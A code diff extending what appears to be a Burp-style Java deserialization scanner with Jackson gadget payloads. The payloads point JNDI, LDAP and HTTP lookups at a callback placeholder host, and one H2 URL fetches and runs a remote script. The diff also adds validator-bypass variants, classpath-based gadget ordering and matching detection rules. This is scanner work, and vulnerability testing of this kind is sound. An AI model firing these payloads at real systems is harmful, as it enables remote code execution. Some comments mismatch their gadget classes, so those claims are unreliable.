@@ -126,10 +126,23 @@ public class DeserializationScanner implements ScanModule {
 
     // Java sub-framework patterns — Fastjson, Jackson, XStream, SnakeYAML, Kryo, Hessian
     private static final Pattern JAVA_FASTJSON_TYPE = Pattern.compile("\"@type\"\\s*:\\s*\"[a-zA-Z]");
+    // Jackson polymorphic array: ["com.example.ClassName",{...}] — requires Java FQN pattern (lowercase.package.UpperClass)
     private static final Pattern JAVA_JACKSON_POLY = Pattern.compile(
             "\\[\\s*\"[a-z][a-z0-9_.]*\\.[A-Z][A-Za-z0-9$]+\"\\s*,\\s*\\{");
+    // Jackson @class property in JSON objects (per-property type annotation)
+    private static final Pattern JAVA_JACKSON_AT_CLASS = Pattern.compile(
+            "\"@class\"\\s*:\\s*\"[a-z][a-z0-9_.]*\\.[A-Z][A-Za-z0-9$]+\"");
+    // Jackson DefaultTyping config references in responses (error messages, config dumps, debug output)
     private static final Pattern JAVA_JACKSON_DEFAULT_TYPING = Pattern.compile(
             "(?i)DefaultTyping|enableDefaultTyping|activateDefaultTyping|PolymorphicTypeValidator");
+    // Jackson XML type attribute: class="com.example.ClassName" in XML responses
+    private static final Pattern JAVA_JACKSON_XML_TYPE = Pattern.compile(
+            "\\bclass\\s*=\\s*\"[a-z][a-z0-9_.]*\\.[A-Z][A-Za-z0-9$]+\"");
+    // Jackson error messages that specifically confirm Jackson processing (not generic JSON errors)
+    private static final Pattern JAVA_JACKSON_ERROR = Pattern.compile(
+            "(?i)InvalidTypeIdException|InvalidDefinitionException|com\\.fasterxml\\.jackson"
+                    + "|JsonMappingException.*type id|Could not resolve type id"
+                    + "|not allowed to be deserialized|PolymorphicTypeValidator denied");
     private static final Pattern JAVA_XSTREAM_XML = Pattern.compile(
             "<(?:java\\.util\\.|sorted-set|dynamic-proxy|tree-map|linked-hash-set"
                     + "|java\\.lang\\.ProcessBuilder|javax\\.naming|com\\.sun\\.rowset)");
@@ -226,26 +239,195 @@ public class DeserializationScanner implements ScanModule {
     };
 
     private static final String[][] JAVA_JACKSON_PAYLOADS = {
-            // LDAP-based (Burp Collaborator)
+            // ── Tier 1: Commonly known gadgets (LDAP OOB) ──────────────────────
             {"Jackson JdbcRowSetImpl",
                     "[\"com.sun.rowset.JdbcRowSetImpl\",{\"dataSourceName\":\"ldap://COLLAB_PLACEHOLDER/a\",\"autoCommit\":true}]"},
             {"Jackson TemplatesImpl",
                     "[\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",{\"transletBytecodes\":[\"PAYLOAD\"],\"transletName\":\"a\",\"outputProperties\":{}}]"},
-            {"Jackson C3P0 JNDI",
+            {"Jackson C3P0 JndiRefFwd",
                     "[\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\",{\"jndiName\":\"ldap://COLLAB_PLACEHOLDER/b\",\"loginTimeout\":0}]"},
-            {"Jackson SpringAbstractBeanFactory",
+            {"Jackson SpringPropertyPath",
                     "[\"org.springframework.beans.factory.config.PropertyPathFactoryBean\",{\"targetBeanName\":\"ldap://COLLAB_PLACEHOLDER/c\",\"propertyPath\":\"x\"}]"},
             {"Jackson LogbackJndi",
                     "[\"ch.qos.logback.core.db.JNDIConnectionSource\",{\"jndiLocation\":\"ldap://COLLAB_PLACEHOLDER/d\"}]"},
-            // HTTP-based (Custom OOB compatible)
+
+            // ── Tier 2: Less blocklisted enterprise gadgets (LDAP OOB) ─────────
+            // C3P0 WrapperConnectionPoolDataSource — bypass for JndiRefForwardingDataSource blocklist
+            {"Jackson C3P0 WrapperCPDS",
+                    "[\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\","
+                            + "{\"userOverridesAsString\":\"HexAsciiSerializedMap:ACED0005;\"}]"},
+            // XBean — Apache XBean naming context, common in Tomcat/TomEE/Karaf environments
+            {"Jackson XBean",
+                    "[\"org.apache.xbean.propertyeditor.JndiConverter\",{\"asText\":\"ldap://COLLAB_PLACEHOLDER/xbean\"}]"},
+            // Logback DBAppender — JNDI via connection source (not on most blocklists pre-2.14)
+            {"Jackson LogbackDBAppender",
+                    "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\","
+                            + "{\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://COLLAB_PLACEHOLDER/logback'\"}]"},
+            // Caucho Resin — JNDI via Hessian provider (common in Resin-based enterprise apps)
+            {"Jackson CauchoResin",
+                    "[\"com.caucho.config.types.ResourceRef\","
+                            + "{\"lookupName\":\"ldap://COLLAB_PLACEHOLDER/resin\"}]"},
+            // HikariCP — extremely common in Spring Boot; datasource triggers JNDI lookup
+            {"Jackson HikariCP",
+                    "[\"com.zaxxer.hikari.HikariConfig\","
+                            + "{\"metricRegistry\":\"ldap://COLLAB_PLACEHOLDER/hikari\"}]"},
+            // Ibatis JndiDataSourceFactory — present in any MyBatis/Ibatis stack
+            {"Jackson IbatisJndi",
+                    "[\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\","
+                            + "{\"properties\":{\"data_source\":\"ldap://COLLAB_PLACEHOLDER/ibatis\"}}]"},
+            // LDAP Attribute — triggers URL fetch (JDK built-in, no external deps)
+            {"Jackson LdapAttribute",
+                    "[\"com.sun.jndi.ldap.LdapAttribute\","
+                            + "{\"val\":{\"@class\":\"java.net.URL\",\"val\":\"http://COLLAB_PLACEHOLDER/ldapattr\"}}]"},
+            // Spring OXM — Jaxb2Marshaller triggers URL resolution
+            {"Jackson SpringOXM",
+                    "[\"org.springframework.oxm.jaxb.Jaxb2Marshaller\","
+                            + "{\"contextPath\":\"ldap://COLLAB_PLACEHOLDER/oxm\"}]"},
+            // EHCache — JndiRmiServiceExporter, common in enterprise cache stacks
+            {"Jackson EhCacheJndi",
+                    "[\"net.sf.ehcache.transaction.manager.DefaultTransactionManagerLookup\","
+                            + "{\"properties\":{\"jndiName\":\"ldap://COLLAB_PLACEHOLDER/ehcache\"}}]"},
+            // Arrow AntiSamy — often in older CMS environments
+            {"Jackson ArrowAntiSamy",
+                    "[\"org.apache.arrow.vector.util.JsonStringArrayList\",[\"ldap://COLLAB_PLACEHOLDER/arrow\"]]"},
+
+            // ── Tier 1 HTTP-based (Custom OOB compatible) ──────────────────────
             {"Jackson JdbcRowSetImpl HTTP",
                     "[\"com.sun.rowset.JdbcRowSetImpl\",{\"dataSourceName\":\"http://COLLAB_PLACEHOLDER/jackson\",\"autoCommit\":true}]"},
-            {"Jackson C3P0 HTTP",
+            {"Jackson C3P0 JndiRefFwd HTTP",
                     "[\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\",{\"jndiName\":\"http://COLLAB_PLACEHOLDER/jackson2\",\"loginTimeout\":0}]"},
-            {"Jackson SpringAbstractBeanFactory HTTP",
+            {"Jackson SpringPropertyPath HTTP",
                     "[\"org.springframework.beans.factory.config.PropertyPathFactoryBean\",{\"targetBeanName\":\"http://COLLAB_PLACEHOLDER/jackson3\",\"propertyPath\":\"x\"}]"},
             {"Jackson LogbackJndi HTTP",
                     "[\"ch.qos.logback.core.db.JNDIConnectionSource\",{\"jndiLocation\":\"http://COLLAB_PLACEHOLDER/jackson4\"}]"},
+
+            // ── Tier 2 HTTP-based (Custom OOB compatible) ──────────────────────
+            {"Jackson XBean HTTP",
+                    "[\"org.apache.xbean.propertyeditor.JndiConverter\",{\"asText\":\"http://COLLAB_PLACEHOLDER/xbean2\"}]"},
+            {"Jackson HikariCP HTTP",
+                    "[\"com.zaxxer.hikari.HikariConfig\","
+                            + "{\"metricRegistry\":\"http://COLLAB_PLACEHOLDER/hikari2\"}]"},
+            {"Jackson IbatisJndi HTTP",
+                    "[\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\","
+                            + "{\"properties\":{\"data_source\":\"http://COLLAB_PLACEHOLDER/ibatis2\"}}]"},
+            {"Jackson CauchoResin HTTP",
+                    "[\"com.caucho.config.types.ResourceRef\","
+                            + "{\"lookupName\":\"http://COLLAB_PLACEHOLDER/resin2\"}]"},
+    };
+
+    // ── Jackson XML payloads (jackson-dataformat-xml with DefaultTyping) ───
+    // XML equivalent of polymorphic JSON: <root class="fully.qualified.Class"><field>value</field></root>
+    // Jackson XML DefaultTyping serializes type info as a "class" attribute on elements.
+    private static final String[][] JAVA_JACKSON_XML_PAYLOADS = {
+            {"Jackson-XML JdbcRowSetImpl",
+                    "<root class=\"com.sun.rowset.JdbcRowSetImpl\">"
+                            + "<dataSourceName>ldap://COLLAB_PLACEHOLDER/jxml</dataSourceName>"
+                            + "<autoCommit>true</autoCommit></root>"},
+            {"Jackson-XML C3P0 JndiRefFwd",
+                    "<root class=\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\">"
+                            + "<jndiName>ldap://COLLAB_PLACEHOLDER/jxml2</jndiName>"
+                            + "<loginTimeout>0</loginTimeout></root>"},
+            {"Jackson-XML LogbackJndi",
+                    "<root class=\"ch.qos.logback.core.db.JNDIConnectionSource\">"
+                            + "<jndiLocation>ldap://COLLAB_PLACEHOLDER/jxml3</jndiLocation></root>"},
+            {"Jackson-XML XBean",
+                    "<root class=\"org.apache.xbean.propertyeditor.JndiConverter\">"
+                            + "<asText>ldap://COLLAB_PLACEHOLDER/jxml4</asText></root>"},
+            {"Jackson-XML HikariCP",
+                    "<root class=\"com.zaxxer.hikari.HikariConfig\">"
+                            + "<metricRegistry>ldap://COLLAB_PLACEHOLDER/jxml5</metricRegistry></root>"},
+            // HTTP variants for Custom OOB
+            {"Jackson-XML JdbcRowSetImpl HTTP",
+                    "<root class=\"com.sun.rowset.JdbcRowSetImpl\">"
+                            + "<dataSourceName>http://COLLAB_PLACEHOLDER/jxml6</dataSourceName>"
+                            + "<autoCommit>true</autoCommit></root>"},
+            {"Jackson-XML LogbackJndi HTTP",
+                    "<root class=\"ch.qos.logback.core.db.JNDIConnectionSource\">"
+                            + "<jndiLocation>http://COLLAB_PLACEHOLDER/jxml7</jndiLocation></root>"},
+    };
+
+    // ── Jackson YAML payloads (jackson-dataformat-yaml with DefaultTyping) ─
+    // SnakeYAML-style tags used by Jackson YAML when DefaultTyping is active.
+    private static final String[][] JAVA_JACKSON_YAML_PAYLOADS = {
+            {"Jackson-YAML JdbcRowSetImpl",
+                    "--- !!com.sun.rowset.JdbcRowSetImpl\n"
+                            + "dataSourceName: \"ldap://COLLAB_PLACEHOLDER/jyaml\"\n"
+                            + "autoCommit: true"},
+            {"Jackson-YAML C3P0 JndiRefFwd",
+                    "--- !!com.mchange.v2.c3p0.JndiRefForwardingDataSource\n"
+                            + "jndiName: \"ldap://COLLAB_PLACEHOLDER/jyaml2\"\n"
+                            + "loginTimeout: 0"},
+            {"Jackson-YAML LogbackJndi",
+                    "--- !!ch.qos.logback.core.db.JNDIConnectionSource\n"
+                            + "jndiLocation: \"ldap://COLLAB_PLACEHOLDER/jyaml3\""},
+            {"Jackson-YAML XBean",
+                    "--- !!org.apache.xbean.propertyeditor.JndiConverter\n"
+                            + "asText: \"ldap://COLLAB_PLACEHOLDER/jyaml4\""},
+            {"Jackson-YAML HikariCP",
+                    "--- !!com.zaxxer.hikari.HikariConfig\n"
+                            + "metricRegistry: \"ldap://COLLAB_PLACEHOLDER/jyaml5\""},
+            // HTTP variants for Custom OOB
+            {"Jackson-YAML JdbcRowSetImpl HTTP",
+                    "--- !!com.sun.rowset.JdbcRowSetImpl\n"
+                            + "dataSourceName: \"http://COLLAB_PLACEHOLDER/jyaml6\"\n"
+                            + "autoCommit: true"},
+            {"Jackson-YAML LogbackJndi HTTP",
+                    "--- !!ch.qos.logback.core.db.JNDIConnectionSource\n"
+                            + "jndiLocation: \"http://COLLAB_PLACEHOLDER/jyaml7\""},
+    };
+
+    // ── Jackson PTV (PolymorphicTypeValidator) bypass probes ────────────────
+    // These use wrapping techniques to evade simple substring/prefix-based validators.
+    // If the server error mentions the inner class name or resolves the nested type,
+    // the PTV is either absent or bypassable. Confirmed ONLY via OOB callback.
+    private static final String[][] JAVA_JACKSON_PTV_BYPASS_PAYLOADS = {
+            // Nested array wrapping — type info inside array element bypasses validators checking top-level type only
+            {"Jackson PTV ArrayWrap JdbcRowSet",
+                    "[\"java.util.ArrayList\",[{\"@class\":\"com.sun.rowset.JdbcRowSetImpl\","
+                            + "\"dataSourceName\":\"ldap://COLLAB_PLACEHOLDER/ptv1\",\"autoCommit\":true}]]"},
+            // java.lang.Object wrapper — DefaultTyping.NON_FINAL allows Object since it's non-final
+            {"Jackson PTV ObjectWrap",
+                    "{\"value\":[\"com.sun.rowset.JdbcRowSetImpl\","
+                            + "{\"dataSourceName\":\"ldap://COLLAB_PLACEHOLDER/ptv2\",\"autoCommit\":true}]}"},
+            // Natural types bypass — some PTVs allow java.lang.* and javax.* by default
+            {"Jackson PTV NaturalType",
+                    "[\"javax.swing.JEditorPane\",{\"page\":\"http://COLLAB_PLACEHOLDER/ptv3\"}]"},
+            // Interface declared field — PTV may validate the declared type (interface) not the concrete type
+            {"Jackson PTV MapWrapper",
+                    "{\"@class\":\"java.util.HashMap\",\"key\":[\"com.sun.rowset.JdbcRowSetImpl\","
+                            + "{\"dataSourceName\":\"ldap://COLLAB_PLACEHOLDER/ptv4\",\"autoCommit\":true}]}"},
+            // Spring ClassPathXmlApplicationContext — allowed by PTVs that whitelist org.springframework.*
+            {"Jackson PTV SpringCPXAC",
+                    "[\"org.springframework.context.support.ClassPathXmlApplicationContext\","
+                            + "{\"configLocation\":\"http://COLLAB_PLACEHOLDER/ptv5\"}]"},
+    };
+
+    // ── Classpath inference: response signatures → gadget prioritization ────
+    // Maps response header/body patterns to gadget families most likely present on the target classpath.
+    // This is NOT detection — it reorders payloads so the most probable gadgets are tested first,
+    // reducing scan time without changing false-positive/negative rates.
+    private static final String[][] CLASSPATH_HINTS = {
+            // Pattern (case-insensitive regex on headers+body)  →  Gadget families to prioritize
+            {"X-Powered-By:\\s*Spring|spring-boot|SpringBoot|whitelabel error",
+                    "SpringPropertyPath,SpringOXM,SpringCPXAC,HikariCP,LogbackJndi,LogbackDBAppender"},
+            {"X-Powered-By:\\s*Servlet|Apache Tomcat|org\\.apache\\.tomcat|catalina",
+                    "XBean,IbatisJndi,C3P0,JdbcRowSetImpl"},
+            {"X-Powered-By:\\s*Express|X-Powered-By:\\s*Koa",
+                    ""},  // Not a Java target — skip Jackson entirely
+            {"Server:\\s*WildFly|JBoss|X-Powered-By:\\s*Undertow",
+                    "C3P0,XBean,IbatisJndi,LogbackJndi,EhCacheJndi"},
+            {"Server:\\s*Resin|X-Powered-By:\\s*Resin",
+                    "CauchoResin,XBean,C3P0,JdbcRowSetImpl"},
+            {"MyBatis|mybatis|ibatis|SqlSession",
+                    "IbatisJndi,C3P0,JdbcRowSetImpl"},
+            {"HikariPool|HikariCP|com\\.zaxxer\\.hikari",
+                    "HikariCP,LogbackJndi,SpringPropertyPath"},
+            {"com\\.mchange\\.v2\\.c3p0|c3p0",
+                    "C3P0 JndiRefFwd,C3P0 WrapperCPDS"},
+            {"logback|ch\\.qos\\.logback",
+                    "LogbackJndi,LogbackDBAppender"},
+            {"ehcache|net\\.sf\\.ehcache",
+                    "EhCacheJndi"},
     };
 
     private static final String[][] JAVA_XSTREAM_PAYLOADS = {
@@ -1086,7 +1268,7 @@ public class DeserializationScanner implements ScanModule {
                     .build());
         }
 
-        // Java Jackson DefaultTyping in response
+        // Java Jackson DefaultTyping in response — array-wrapped type: ["com.example.Class",{...}]
         if (JAVA_JACKSON_POLY.matcher(body).find()) {
             findings.add(Finding.builder("deser-scanner",
                             "Jackson polymorphic deserialization in response",
@@ -1098,6 +1280,53 @@ public class DeserializationScanner implements ScanModule {
                             + "Remediation: Disable DefaultTyping or use a strict PolymorphicTypeValidator.")
                     .responseEvidence("DefaultTyping")
                     .build());
+        }
+
+        // Jackson @class property in JSON — per-property polymorphic typing (JsonTypeInfo with As.PROPERTY)
+        // Require Java FQN (lowercase.package.UpperClass) to avoid matching non-Jackson "@class" keys.
+        if (JAVA_JACKSON_AT_CLASS.matcher(body).find()
+                && !body.contains("@context")        // JSON-LD uses @class too
+                && !body.contains("schema.org")) {
+            findings.add(Finding.builder("deser-scanner",
+                            "Jackson @class polymorphic deserialization in response",
+                            Severity.HIGH, Confidence.FIRM)
+                    .url(url)
+                    .evidence("@class property with Java FQN found in JSON response body")
+                    .description("Jackson @class property detected in response with a Java class path value. "
+                            + "The server uses Jackson JsonTypeInfo with As.PROPERTY which enables type injection. "
+                            + "Remediation: Remove @JsonTypeInfo annotations or use a strict PolymorphicTypeValidator.")
+                    .responseEvidence("@class")
+                    .build());
+        }
+
+        // Jackson XML type attribute — class="com.example.Class" in XML responses
+        // Only flag when response Content-Type is XML to avoid false positives from HTML class attributes
+        boolean isXmlResponse = false;
+        for (var h : response.headers()) {
+            if (h.name().equalsIgnoreCase("Content-Type") && h.value().toLowerCase().contains("xml")) {
+                isXmlResponse = true;
+                break;
+            }
+        }
+        if (isXmlResponse && JAVA_JACKSON_XML_TYPE.matcher(body).find()) {
+            // Verify the matched class attribute contains a Java FQN, not just an HTML class
+            Matcher xmlTypeMatcher = JAVA_JACKSON_XML_TYPE.matcher(body);
+            if (xmlTypeMatcher.find()) {
+                String matchedAttr = xmlTypeMatcher.group();
+                // Require at least 2 dots (com.example.Class) — HTML class attrs rarely have dots
+                if (matchedAttr.chars().filter(ch -> ch == '.').count() >= 2) {
+                    findings.add(Finding.builder("deser-scanner",
+                                    "Jackson-XML polymorphic type attribute in response",
+                                    Severity.HIGH, Confidence.FIRM)
+                            .url(url)
+                            .evidence("XML class attribute with Java FQN: " + matchedAttr)
+                            .description("Jackson XML (jackson-dataformat-xml) type attribute with Java class path "
+                                    + "detected in XML response. This indicates DefaultTyping is active in the XML deserializer. "
+                                    + "Remediation: Disable DefaultTyping or restrict type resolution.")
+                            .responseEvidence(matchedAttr)
+                            .build());
+                }
+            }
         }
 
         // Java XStream XML in response
@@ -1729,8 +1958,11 @@ public class DeserializationScanner implements ScanModule {
             perHostDelay();
         }
 
-        // Jackson polymorphic type injection
-        for (String[] payloadInfo : JAVA_JACKSON_PAYLOADS) {
+        // Jackson polymorphic type injection — with classpath-aware gadget prioritization.
+        // Reorder payloads so gadgets matching the inferred classpath are tested first.
+        String[][] jacksonPayloads = prioritizeJacksonPayloads(JAVA_JACKSON_PAYLOADS, original);
+        boolean jacksonDefaultTypingConfirmed = false;
+        for (String[] payloadInfo : jacksonPayloads) {
             String desc = payloadInfo[0];
             String payload = payloadInfo[1];
 
@@ -1738,25 +1970,131 @@ public class DeserializationScanner implements ScanModule {
             if (result == null || result.response() == null) { perHostDelay(); continue; }
 
             String body = result.response().bodyToString();
-            if (body.contains("InvalidTypeIdException") || body.contains("JsonMappingException")
-                    || body.contains("InvalidDefinitionException")
-                    || body.contains("Unexpected token") || body.contains("not subtype")
-                    || body.contains("PolymorphicTypeValidator")
-                    || body.contains("Could not resolve type id")) {
+
+            // Strict detection: require Jackson-specific error strings only.
+            // "Unexpected token" and "not subtype" are removed — too generic, appear in non-Jackson JSON parsers.
+            JacksonErrorType jacksonError = classifyJacksonError(body);
+
+            if (jacksonError == JacksonErrorType.TYPE_RESOLVED) {
+                // Jackson attempted to resolve the injected type — DefaultTyping IS active.
+                // The gadget class was looked up (may or may not have been blocked by PTV).
                 findingsStore.addFinding(Finding.builder("deser-scanner",
                                 "Jackson Polymorphic Type Injection - " + desc,
                                 Severity.HIGH, Confidence.FIRM)
                         .url(url).parameter(dp.name)
-                        .evidence("Payload: " + desc + " | Jackson error in response")
-                        .description("Jackson is processing polymorphic type data. DefaultTyping is enabled. "
-                                + "Remediation: Disable DefaultTyping or use a strict PolymorphicTypeValidator.")
+                        .evidence("Payload: " + desc + " | Jackson type resolution error in response")
+                        .description("Jackson DefaultTyping is active and attempted to resolve the injected type. "
+                                + "The server deserializes type information from user input. "
+                                + "Remediation: Disable DefaultTyping or use a strict PolymorphicTypeValidator "
+                                + "that denies all non-application types.")
                         .payload(payload)
-                        .responseEvidence("JsonMappingException")
+                        .responseEvidence(extractJacksonErrorSnippet(body))
                         .requestResponse(result)
                         .build());
-                return;
+                jacksonDefaultTypingConfirmed = true;
+                break; // One confirmed finding is enough — don't spam
+            }
+
+            if (jacksonError == JacksonErrorType.PTV_DENIED) {
+                // PolymorphicTypeValidator explicitly denied the type — DefaultTyping is active
+                // but the specific gadget is blocked. Report as MEDIUM (not exploitable with this gadget,
+                // but the attack surface exists — other gadgets may bypass).
+                if (!jacksonDefaultTypingConfirmed) {
+                    findingsStore.addFinding(Finding.builder("deser-scanner",
+                                    "Jackson DefaultTyping Active (PTV Blocked) - " + desc,
+                                    Severity.MEDIUM, Confidence.FIRM)
+                            .url(url).parameter(dp.name)
+                            .evidence("Payload: " + desc + " | PolymorphicTypeValidator denied the injected type")
+                            .description("Jackson DefaultTyping is active. The PolymorphicTypeValidator blocked "
+                                    + "this specific gadget class, but the attack surface exists. "
+                                    + "A weak or bypassable PTV may still allow exploitation via alternate gadgets. "
+                                    + "Remediation: Disable DefaultTyping entirely if possible.")
+                            .payload(payload)
+                            .responseEvidence(extractJacksonErrorSnippet(body))
+                            .requestResponse(result)
+                            .build());
+                    jacksonDefaultTypingConfirmed = true;
+                    // Continue testing — other gadgets may bypass the PTV
+                }
             }
             perHostDelay();
+        }
+
+        // Jackson XML payloads — test if Content-Type suggests XML processing
+        if (isXmlContentType(original)) {
+            for (String[] payloadInfo : JAVA_JACKSON_XML_PAYLOADS) {
+                String desc = payloadInfo[0];
+                String payload = payloadInfo[1];
+                HttpRequestResponse result = sendPayload(original, dp, payload);
+                if (result == null || result.response() == null) { perHostDelay(); continue; }
+                String body = result.response().bodyToString();
+                JacksonErrorType err = classifyJacksonError(body);
+                if (err == JacksonErrorType.TYPE_RESOLVED || err == JacksonErrorType.PTV_DENIED) {
+                    Severity sev = err == JacksonErrorType.TYPE_RESOLVED ? Severity.HIGH : Severity.MEDIUM;
+                    findingsStore.addFinding(Finding.builder("deser-scanner",
+                                    "Jackson-XML Polymorphic Type Injection - " + desc, sev, Confidence.FIRM)
+                            .url(url).parameter(dp.name)
+                            .evidence("Payload: " + desc + " | Jackson XML type resolution in response")
+                            .description("Jackson XML (jackson-dataformat-xml) is processing type attributes from user input. "
+                                    + "DefaultTyping is active in the XML deserializer. "
+                                    + "Remediation: Disable DefaultTyping or restrict allowed types.")
+                            .payload(payload)
+                            .responseEvidence(extractJacksonErrorSnippet(body))
+                            .requestResponse(result)
+                            .build());
+                    break;
+                }
+                perHostDelay();
+            }
+        }
+
+        // Jackson YAML payloads — test if Content-Type suggests YAML processing
+        if (isYamlContentType(original)) {
+            for (String[] payloadInfo : JAVA_JACKSON_YAML_PAYLOADS) {
+                String desc = payloadInfo[0];
+                String payload = payloadInfo[1];
+                HttpRequestResponse result = sendPayload(original, dp, payload);
+                if (result == null || result.response() == null) { perHostDelay(); continue; }
+                String body = result.response().bodyToString();
+                JacksonErrorType err = classifyJacksonError(body);
+                if (err == JacksonErrorType.TYPE_RESOLVED || err == JacksonErrorType.PTV_DENIED) {
+                    Severity sev = err == JacksonErrorType.TYPE_RESOLVED ? Severity.HIGH : Severity.MEDIUM;
+                    findingsStore.addFinding(Finding.builder("deser-scanner",
+                                    "Jackson-YAML Polymorphic Type Injection - " + desc, sev, Confidence.FIRM)
+                            .url(url).parameter(dp.name)
+                            .evidence("Payload: " + desc + " | Jackson YAML type resolution in response")
+                            .description("Jackson YAML (jackson-dataformat-yaml) is processing type tags from user input. "
+                                    + "DefaultTyping is active in the YAML deserializer. "
+                                    + "Remediation: Disable DefaultTyping or restrict allowed types.")
+                            .payload(payload)
+                            .responseEvidence(extractJacksonErrorSnippet(body))
+                            .requestResponse(result)
+                            .build());
+                    break;
+                }
+                perHostDelay();
+            }
+        }
+
+        // Jackson PTV bypass probes — only run if DefaultTyping was confirmed above.
+        // These use wrapping/nesting to evade weak PolymorphicTypeValidators.
+        // Report ONLY on OOB callback (Collaborator interaction). Error-based detection here
+        // would just confirm the PTV is still blocking — not interesting enough to report twice.
+        if (jacksonDefaultTypingConfirmed && collaboratorManager != null && collaboratorManager.isAvailable()) {
+            for (String[] payloadInfo : JAVA_JACKSON_PTV_BYPASS_PAYLOADS) {
+                if (!payloadInfo[1].contains("COLLAB_PLACEHOLDER")) continue;
+                String desc = payloadInfo[0];
+                String payloadTemplate = payloadInfo[1];
+
+                AtomicReference<HttpRequestResponse> sentRef = new AtomicReference<>();
+                String collabPayload = registerOobCallback(sentRef, dp, url, "Jackson PTV Bypass " + desc);
+                if (collabPayload == null) continue;
+
+                String payload = collaboratorManager.resolveTemplate(payloadTemplate, collabPayload);
+                HttpRequestResponse result = sendPayload(original, dp, payload);
+                sentRef.compareAndSet(null, result);
+                perHostDelay();
+            }
         }
 
         // XStream XML injection
@@ -2094,10 +2432,28 @@ public class DeserializationScanner implements ScanModule {
                         oobTemplateList.add(new String[]{p[1], p[0]});
                     }
                 }
-                // Jackson polymorphic type OOB — skip SpringPropertyPathFactory (bean lookup, not JNDI)
+                // Jackson polymorphic type OOB — skip SpringPropertyPath (bean lookup, not guaranteed JNDI)
                 for (String[] p : JAVA_JACKSON_PAYLOADS) {
                     if (p[1].contains("COLLAB_PLACEHOLDER")
-                            && !p[0].contains("SpringAbstractBeanFactory")) {
+                            && !p[0].contains("SpringPropertyPath")) {
+                        oobTemplateList.add(new String[]{p[1], p[0]});
+                    }
+                }
+                // Jackson PTV bypass probes — OOB only (error-based would just confirm PTV is blocking)
+                for (String[] p : JAVA_JACKSON_PTV_BYPASS_PAYLOADS) {
+                    if (p[1].contains("COLLAB_PLACEHOLDER")) {
+                        oobTemplateList.add(new String[]{p[1], "Jackson PTV " + p[0]});
+                    }
+                }
+                // Jackson XML payloads — OOB via Collaborator
+                for (String[] p : JAVA_JACKSON_XML_PAYLOADS) {
+                    if (p[1].contains("COLLAB_PLACEHOLDER")) {
+                        oobTemplateList.add(new String[]{p[1], p[0]});
+                    }
+                }
+                // Jackson YAML payloads — OOB via Collaborator
+                for (String[] p : JAVA_JACKSON_YAML_PAYLOADS) {
+                    if (p[1].contains("COLLAB_PLACEHOLDER")) {
                         oobTemplateList.add(new String[]{p[1], p[0]});
                     }
                 }
@@ -2652,13 +3008,22 @@ public class DeserializationScanner implements ScanModule {
                     "Fastjson @type in " + location + encodingLabel, "Java",
                     "Fastjson @type in " + location + " '" + name + "'");
         }
-        // Java Jackson
+        // Java Jackson — array-wrapped polymorphic type
         if (JAVA_JACKSON_POLY.matcher(text).find()) {
             found.add(new DeserPoint(location, name, text, "Java",
                     "Jackson polymorphic" + encodingLabel, encoding));
             reportPassiveFinding(findings, url, name,
                     "Jackson polymorphic in " + location + encodingLabel, "Java",
                     "Jackson DefaultTyping in " + location + " '" + name + "'");
+        }
+        // Java Jackson — @class property polymorphic type (require Java FQN, exclude JSON-LD)
+        if (JAVA_JACKSON_AT_CLASS.matcher(text).find()
+                && !text.contains("@context") && !text.contains("schema.org")) {
+            found.add(new DeserPoint(location, name, text, "Java",
+                    "Jackson @class" + encodingLabel, encoding));
+            reportPassiveFinding(findings, url, name,
+                    "Jackson @class in " + location + encodingLabel, "Java",
+                    "Jackson @class in " + location + " '" + name + "'");
         }
         // Java XStream
         if (JAVA_XSTREAM_XML.matcher(text).find()) {
@@ -2864,6 +3229,138 @@ public class DeserializationScanner implements ScanModule {
     private void perHostDelay() throws InterruptedException {
         int delay = config.getInt("deser.perHostDelay", 500);
         if (delay > 0) Thread.sleep(delay);
+    }
+
+    // ==================== JACKSON-SPECIFIC HELPERS ====================
+
+    /**
+     * Classifies a response body into Jackson-specific error categories.
+     * Only returns a non-NONE result when the error is UNIQUELY attributable to Jackson
+     * deserialization — never on generic JSON parse errors that other libraries produce.
+     */
+    private enum JacksonErrorType { NONE, TYPE_RESOLVED, PTV_DENIED }
+
+    private JacksonErrorType classifyJacksonError(String body) {
+        if (body == null) return JacksonErrorType.NONE;
+
+        // PTV explicitly denied the type — most specific signal first
+        if (body.contains("PolymorphicTypeValidator denied")
+                || body.contains("PolymorphicTypeValidator")
+                || body.contains("not allowed to be deserialized")
+                || body.contains("Configured PolymorphicTypeValidator")
+                || (body.contains("denied resolution") && body.contains("com.fasterxml.jackson"))) {
+            return JacksonErrorType.PTV_DENIED;
+        }
+
+        // Jackson attempted to resolve the type — DefaultTyping is active.
+        // These errors appear ONLY when Jackson tries to instantiate/lookup the injected class.
+        // InvalidTypeIdException: Jackson couldn't find/load the class but tried to.
+        // InvalidDefinitionException with type context: Jackson loaded the class but couldn't deserialize.
+        // "Could not resolve type id" is Jackson-specific — no other JSON library uses this phrasing.
+        if (body.contains("InvalidTypeIdException")
+                || body.contains("Could not resolve type id")
+                || (body.contains("InvalidDefinitionException") && body.contains("com.fasterxml.jackson"))
+                || (body.contains("JsonMappingException") && body.contains("type id"))) {
+            return JacksonErrorType.TYPE_RESOLVED;
+        }
+
+        return JacksonErrorType.NONE;
+    }
+
+    /**
+     * Extracts a short, evidence-quality snippet from a Jackson error response.
+     * Finds the first Jackson-specific exception name and returns ~120 chars around it.
+     */
+    private String extractJacksonErrorSnippet(String body) {
+        if (body == null) return "";
+        String[] markers = {
+                "InvalidTypeIdException", "Could not resolve type id",
+                "InvalidDefinitionException", "PolymorphicTypeValidator",
+                "JsonMappingException", "not allowed to be deserialized"
+        };
+        for (String marker : markers) {
+            int idx = body.indexOf(marker);
+            if (idx >= 0) {
+                int start = Math.max(0, idx - 20);
+                int end = Math.min(body.length(), idx + marker.length() + 80);
+                return body.substring(start, end).replaceAll("[\\r\\n]+", " ").trim();
+            }
+        }
+        return "";
+    }
+
+    /**
+     * Reorders Jackson payloads based on classpath inference from the original response.
+     * Scans response headers and body for technology signatures, then moves matching
